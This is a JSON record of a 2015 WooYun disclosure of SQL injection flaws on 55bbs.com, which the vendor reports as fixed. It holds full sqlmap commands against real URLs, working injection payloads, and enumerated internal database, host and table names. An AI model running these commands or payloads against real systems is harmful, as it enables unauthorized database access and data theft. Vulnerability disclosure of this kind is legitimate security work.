{"id": 38929, "wybug_id": "wooyun-2015-0114776", "wybug_title": "我爱购物网多处SQL注入可跨库上百万数据", "wybug_corp": "55bbs.com", "wybug_author": "#6c6c6c", "wybug_date": "2015-05-18 15:14", "wybug_open_date": "2015-05-19 12:55", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-19：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 昨天深夜，一位2b朋友打电话给我，说他车里的方向盘、刹车、油门、离合全被人卸掉了，叫我去接他。我开车到半路的时候，这货又打电话给我说：你不用过来了，刚才喝多了，现在清醒一点才发现原来自己坐在副驾驶座上。。 详细说明：  \nTarget: \t\thttp://youhuiquan.55bbs.com/consume.php?keyword=1Host IP:\t\t118.67.120.221Web Server: \tApachePowered-by: \tPHP/5.3.27DB Server: \tMySQL time basedResp. Time(avg):\t166 msCurrent User: \thunki?55bbs@10.15.184.13Sql Version: \t5.1.61rP+ 2 2-logSystem User: \thunjia55bbs@10.15.184.13Host Name: \tc25-55bbs-dbs-mlt-85.cnet.com.cnInstallation dir: \t/service/server/Perc?na-Server-5.1.61-rel13.2-430.Li?ux.x86_8?/DB User: \t'hunl?a55bbs'@'10.15#18%'Data Bases: \tin?orma?ion_schema\t\t55my_h?njia\t\tV?and\t\thunjiatongji\t\tt?st\t\tucenter\n第一枚\nC:\\Python27\\sqlmap>sqlmap.py -u \"http://100.55bbs.com/?c=List&order=id*&page=15\"--dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150423}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 14:45:19custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] y[14:45:21] [INFO] testing connection to the target URL[14:45:21] [INFO] heuristics detected web page charset 'GB2312'[14:45:21] [INFO] testing if the target URL is stable. This can take a couple of seconds[14:45:22] [INFO] target URL is stable[14:45:22] [INFO] testing if URI parameter '#1*' is dynamic[14:45:23] [INFO] confirming that URI parameter '#1*' is dynamic[14:45:23] [INFO] URI parameter '#1*' is dynamic[14:45:23] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable[14:45:23] [INFO] testing for SQL injection on URI parameter '#1*'[14:45:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[14:45:23] [WARNING] reflective value(s) found and filtering out[14:45:27] [INFO] heuristics detected web page charset 'ISO-8859-2'[14:45:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'[14:45:30] [INFO] URI parameter '#1*' seems to be 'MySQL >= 5.0 boolean-based blind - Parameter replace' injectableit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] yfor the remaining tests, do you want to include all tests for 'MySQL' extendingprovided level (1) and risk (1) values? [Y/n] y[14:48:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[14:48:06] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[14:48:10] [INFO] checking if the injection point on URI parameter '#1*' is a false positive[14:48:12] [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 42 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: http://100.55bbs.com:80/?c=List&order=(SELECT (CASE WHEN (8444=8444) THEN 8444 ELSE 8444*(SELECT 8444 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&page=15--dbs---[14:48:14] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.2.9back-end DBMS: MySQL 5.0[14:48:14] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\100.55bbs.com'[*] shutting down at 14:48:14\n第二枚\nC:\\Python27\\sqlmap>sqlmap.py -u \"http://youhuiquan.55bbs.com/consume.php?keyword=8a\" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150423}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 14:42:12[14:42:12] [INFO] resuming back-end DBMS 'mysql'[14:42:12] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: keyword (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: keyword=-4989' OR 3965=3965#    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: keyword=-5626' OR 1 GROUP BY CONCAT(0x717a626b71,(SELECT (CASE WHEN (2394=2394) THEN 1 ELSE 0 END)),0x7171787171,FLOOR(RAND(0)*2)) HAVING MIN(0)#---[14:42:12] [INFO] the back-end DBMS is MySQLweb application technology: Apache, PHP 5.3.27back-end DBMS: MySQL 5[14:42:12] [INFO] fetching database names[14:42:12] [WARNING] reflective value(s) found and filtering out[14:42:12] [INFO] the SQL query used returns 6 entries[14:42:12] [INFO] retrieved: information_schema[14:42:13] [INFO] retrieved: 55my_hunjia[14:42:13] [INFO] retrieved: brand[14:42:13] [INFO] retrieved: hunjiatongji[14:42:13] [INFO] retrieved: test[14:42:13] [INFO] retrieved: ucenteravailable databases [6]:[*] 55my_hunjia[*] brand[*] hunjiatongji[*] information_schema[*] test[*] ucenter[14:42:13] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\youhuiquan.55bbs.com'[*] shutting down at 14:42:13C:\\Python27\\sqlmap>sqlmap.py -u \"http://youhuiquan.55bbs.com/consume.php?keyword=8a\" --table -D 55my_hunjia         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150423}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 14:42:37[14:42:37] [INFO] resuming back-end DBMS 'mysql'[14:42:37] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: keyword (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: keyword=-4989' OR 3965=3965#    Type: error-based    Title: MySQL OR error-based - WHERE or HAVING clause    Payload: keyword=-5626' OR 1 GROUP BY CONCAT(0x717a626b71,(SELECT (CASE WHEN (2394=2394) THEN 1 ELSE 0 END)),0x7171787171,FLOOR(RAND(0)*2)) HAVING MIN(0)#---[14:42:38] [INFO] the back-end DBMS is MySQLweb application technology: Apache, PHP 5.3.27back-end DBMS: MySQL 5[14:42:38] [INFO] fetching tables for database: '55my_hunjia'[14:42:38] [WARNING] reflective value(s) found and filtering out[14:42:38] [INFO] the SQL query used returns 18 entries[14:42:38] [INFO] retrieved: [Table]shopitems_msg[14:42:38] [INFO] retrieved: budget_items[14:42:38] [INFO] retrieved: items_category[14:42:39] [INFO] retrieved: memo_msg[14:42:39] [INFO] retrieved: my_user_msg[14:42:39] [INFO] retrieved: user_budget[14:42:39] [INFO] retrieved: user_budget_type[14:42:39] [INFO] retrieved: user_relevance[14:42:39] [INFO] retrieved: weddingCardUrl[14:42:39] [INFO] retrieved: wedding_hetong[14:42:40] [INFO] retrieved: wedding_lucky_day[14:42:40] [INFO] retrieved: wedding_music[14:42:40] [INFO] retrieved: wedding_music_type[14:42:40] [INFO] retrieved: wedding_reg_city[14:42:40] [INFO] retrieved: wedding_registration[14:42:40] [INFO] retrieved: wedding_speech[14:42:41] [INFO] retrieved: wedding_speech_type[14:42:41] [INFO] retrieved: wedding_speech_urlDatabase: 55my_hunjia[18 tables]+----------------------+| [Table]shopitems_msg || budget_items         || items_category       || memo_msg             || my_user_msg          || user_budget          || user_budget_type     || user_relevance       || weddingCardUrl       || wedding_hetong       || wedding_lucky_day    || wedding_music        || wedding_music_type   || wedding_reg_city     || wedding_registration || wedding_speech       || wedding_speech_type  || wedding_speech_url   |+----------------------+[14:42:41] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\youhuiquan.55bbs.com'[*] shutting down at 14:42:41\n   漏洞证明：     修复方案：  过滤   版权声明：转载请注明来源 #6c6c6c@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-19 12:51 厂商回复： 漏洞存在，等待修复 最新状态： 2015-05-19：漏洞已解决  ", "replys": "漏洞评价：\n评论\n     2015-05-19 08:40 |    \t\tXXXQQ \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:19        | 一个傻子)\t\t \n  灰色？    \n     2015-05-19 13:00 |    \t\t#6c6c6c \t\t\t( 普通白帽子  |\t\t\t        Rank:291 漏洞数:47        | 像一条狗孤独的活着，渴望的活着，绝望的活...)\t\t \n  @我爱购物网 太吊了你们    \n     2015-05-21 05:25 |    \t\thuasec \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | HUA安全小组)\t\t \n  .... 有是注入  安全做的不咋滴呀！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}